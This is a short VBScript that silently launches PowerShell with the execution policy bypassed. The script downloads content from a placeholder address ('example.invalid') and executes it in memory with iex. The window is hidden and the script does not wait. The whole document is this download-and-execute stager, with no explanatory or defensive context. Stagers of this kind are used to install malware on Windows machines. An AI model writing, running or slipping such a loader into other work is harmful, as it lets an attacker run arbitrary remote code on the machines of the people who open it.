Set s=CreateObject("WScript.Shell")
x="powershell -executionpolicy bypass -c $req=[System.Net.WebRequest]::Create('https://example.invalid/a');$res=$req.GetResponse();iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()"
s.Run(x),0,false
